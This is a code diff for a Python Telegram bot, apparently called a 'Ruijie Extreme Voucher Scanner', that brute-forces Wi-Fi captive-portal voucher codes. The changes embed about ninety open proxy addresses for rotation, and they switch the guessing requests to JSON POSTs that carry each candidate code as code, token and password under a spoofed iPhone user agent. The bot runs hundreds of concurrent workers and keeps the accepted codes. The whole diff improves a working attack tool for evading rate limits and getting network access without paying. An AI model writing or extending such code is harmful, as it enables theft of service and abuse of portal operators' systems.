@@ -11,28 +11,38 @@ from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, Callb
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# ပေးပို့ထားသော Proxy စာရင်းများကို တခါတည်း ထည့်သွင်းထားခြင်း
+EMBEDDED_PROXIES = [
+    "103.77.173.125:9486", "160.19.16.101:8181", "172.210.12.8:3128", "41.33.245.139:1976",
+    "41.128.77.76:1981", "41.128.77.76:1976", "178.92.72.154:8080", "154.201.126.44:8080",
+    "178.92.72.149:8080", "178.92.72.54:8080", "178.92.72.134:8080", "45.194.3.132:8080",
+    "172.236.242.244:3128", "150.241.245.249:8080", "15.235.145.229:1081", "8.219.97.248:80",
+    "102.208.228.90:3128", "184.75.221.82:3118", "68.183.22.37:10000", "43.98.172.166:3128",
+    "27.185.218.213:17981", "45.194.90.194:8080", "178.92.72.194:8080", "120.232.115.57:17981",
+    "45.195.105.20:8080", "202.154.19.50:3125", "116.101.13.84:10001", "156.240.114.210:3129",
+    "150.241.245.131:8080", "123.253.145.165:8080", "103.168.44.83:8081", "34.43.46.91:80",
+    "43.165.191.196:1082", "178.92.72.94:8080", "116.196.150.180:17981", "154.201.127.230:8080",
+    "178.92.72.162:8080", "178.92.72.129:8080", "4.194.233.145:3128", "34.43.46.91:443",
+    "45.194.41.70:8080", "45.194.41.141:8080", "154.201.126.245:8080", "43.156.227.68:80",
+    "43.155.62.157:443", "111.196.31.120:8888", "34.131.37.209:40001", "13.59.172.95:3128",
+    "111.192.49.90:8888", "113.45.195.147:3128", "102.208.228.90:8080", "111.192.40.90:8888",
+    "159.89.87.80:10000", "160.19.18.243:8080", "103.35.156.208:8080", "2.28.105.45:8888",
+    "110.44.115.83:8080", "103.193.144.81:8080", "45.194.41.16:8080", "178.92.72.165:8080",
+    "178.92.72.73:8080", "45.194.3.119:8080", "124.105.79.237:8080", "45.43.60.220:8080",
+    "38.51.207.104:8080", "119.28.233.241:3128", "178.92.72.68:8080", "34.101.229.7:80",
+    "103.180.119.182:8082", "45.194.41.155:8080", "149.71.241.164:8080", "45.194.41.103:8080",
+    "165.225.113.220:11589", "38.47.176.92:80", "68.183.224.109:3128", "103.82.92.104:2406",
+    "41.128.90.53:1981", "180.149.44.182:3128", "14.242.19.156:2001", "36.50.56.237:8080",
+    "103.183.8.135:8080", "61.245.9.172:5050", "103.183.8.139:8080", "192.232.48.18:8181",
+    "45.194.90.225:8080", "103.146.38.53:1080", "102.203.101.77:8080", "220.128.223.136:8081",
+    "43.156.248.220:80", "103.247.14.138:7778", "160.22.207.95:8082"
+]
+
 def load_proxies_from_file():
-    filenames = ["Proxy.txt", "proxy.txt", "proxies.txt", "proxy_list.txt", "list.txt"]
-    proxies = []
-    for filename in filenames:
-        if os.path.exists(filename):
-            try:
-                with open(filename, "r", encoding="utf-8") as f:
-                    proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
-                    if proxies:
-                        print(f"[ProxyManager] Loaded {len(proxies)} proxies from {filename}")
-                        return proxies
-            except Exception as e:
-                print(f"[ProxyManager] Error reading {filename}: {e}")
-                
-    fallback_proxies = [
-        "103.152.112.15:8080",
-        "182.253.150.2:3128",
-        "202.137.7.12:80",
-        "114.6.14.31:8080"
-    ]
-    print("[ProxyManager] Warning: Using default fallback proxies.")
-    return fallback_proxies
+    if EMBEDDED_PROXIES:
+        print(f"[ProxyManager] Loaded {len(EMBEDDED_PROXIES)} proxies directly from script.")
+        return EMBEDDED_PROXIES
+    return ["103.152.112.15:8080"]
 
 scanning_states = {}
 user_modes = {}
@@ -48,7 +58,7 @@ limits_counters = {}
 
 def show_startup_banner():
     print("=" * 65)
-    print("  ⚡  RUIJIE & STARLINK EXTREME VOUCHER SCANNER  ⚡")
+    print("  ⚡  RUIJIE EXTREME VOUCHER SCANNER (EMBEDDED PROXIES)  ⚡")
     print("=" * 65)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -56,7 +66,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if chat_id not in user_modes:
         user_modes[chat_id] = "num6"
     if chat_id not in user_workers:
-        user_workers[chat_id] = 500
+        user_workers[chat_id] = 200
     
     if chat_id not in user_proxies or not user_proxies[chat_id]:
         user_proxies[chat_id] = load_proxies_from_file()
@@ -80,7 +90,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "⚡ Starlink Scanner Control Panel ⚡\n\n"
         f"⚙ Current Mode: {user_modes[chat_id]}\n"
         f"🔧 Workers: {user_workers[chat_id]}\n"
-        f"📁 Proxy File: Proxy.txt\n"
+        f"📁 Proxy Mode: Embedded List\n"
         f"🔀 Proxies: {current_proxy_display}"
     )
     
@@ -124,8 +134,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "change_workers":
         await query.answer()
         keyboard = [
-            [InlineKeyboardButton("500", callback_data="worker_500"), InlineKeyboardButton("800", callback_data="worker_800")],
-            [InlineKeyboardButton("1000", callback_data="worker_1000"), InlineKeyboardButton("🔙 Back", callback_data="worker_back")]
+            [InlineKeyboardButton("100", callback_data="worker_100"), InlineKeyboardButton("200", callback_data="worker_200")],
+            [InlineKeyboardButton("500", callback_data="worker_500"), InlineKeyboardButton("🔙 Back", callback_data="worker_back")]
         ]
         await query.message.edit_text("⚙️ Choose Worker Count", reply_markup=InlineKeyboardMarkup(keyboard))
         
@@ -139,11 +149,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await start(update, context)
 
     elif data == "add_proxies":
-        all_proxies = user_proxies.get(chat_id, [])
-        if not all_proxies:
-            all_proxies = load_proxies_from_file()
-            user_proxies[chat_id] = all_proxies
-        await query.answer("Proxies updated successfully!")
+        user_proxies[chat_id] = load_proxies_from_file()
+        await query.answer("Proxies reloaded successfully!")
         await start(update, context)
     
     elif data == "start_scanner":
@@ -201,20 +208,25 @@ async def worker_task(worker_id, session, portal_url, chat_id):
             proxy = f"http://{proxy}"
             
         try:
-            clean_portal = portal_url.replace("stage=portal", "stage=login")
-            if "?" not in clean_portal:
-                clean_portal += "?"
+            base_url = portal_url.replace("stage=portal", "stage=login")
+            payload = {
+                "code": code_val,
+                "token": code_val,
+                "password": code_val
+            }
+            headers = {
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
+            }
             
-            target_url = f"{clean_portal}&token={code_val}"
-            async with session.get(target_url, proxy=proxy, timeout=3.0) as response:
-                html_content = await response.text()
-                lower_html = html_content.lower()
+            async with session.post(base_url, json=payload, headers=headers, proxy=proxy, timeout=3.0) as response:
+                text_content = await response.text()
+                lower_text = text_content.lower()
                 
-                # တကယ့် ကုဒ်အမှန်ဖြစ်မှသာ လက်ခံရန် တင်းကျပ်သော စစ်ဆေးချက်များ (Strict Validation)
                 is_real_hit = (
                     response.status == 200 and
-                    any(k in lower_html for k in ["success", "authenticated", "auth_pass", "login successfully"]) and
-                    not any(e in lower_html for e in ["error", "fail", "invalid", "expired", "wrong", "incorrect", "portal", "login"])
+                    any(k in lower_text for k in ["success", "authenticated", "auth_pass", "login successfully", "\"code\":200", "\"status\":1"]) and
+                    not any(e in lower_text for e in ["error", "fail", "invalid", "expired", "wrong", "incorrect"])
                 )
                 
                 if is_real_hit:
@@ -222,9 +234,9 @@ async def worker_task(worker_id, session, portal_url, chat_id):
                         found_codes[chat_id] = []
                     if code_val not in found_codes[chat_id]:
                         found_codes[chat_id].append(code_val)
-                elif any(kw in lower_html for kw in ["expired", "invalid", "timeout", "used", "incorrect", "wrong"]):
+                elif any(kw in lower_text for kw in ["expired", "invalid", "timeout", "used", "incorrect", "wrong"]):
                     expired_counters[chat_id] = expired_counters.get(chat_id, 0) + 1
-                elif any(kw in lower_html for kw in ["limit", "already logged", "in use", "too many", "blocked"]):
+                elif any(kw in lower_text for kw in ["limit", "already logged", "in use", "too many", "blocked"]):
                     limits_counters[chat_id] = limits_counters.get(chat_id, 0) + 1
         except Exception:
             pass
@@ -239,7 +251,7 @@ async def run_scanner_with_workers(query, context, portal_url):
     limits_counters[chat_id] = 0
     
     start_time = time.time()
-    workers_count = user_workers.get(chat_id, 500)
+    workers_count = user_workers.get(chat_id, 200)
     
     stop_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Stop", callback_data="stop_scanner_btn")]])
     status_message = await query.message.reply_text("⚡ Scanner Running ...\nThank for using Telegram @Kage", reply_markup=stop_keyboard)
@@ -300,4 +312,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-        
+    
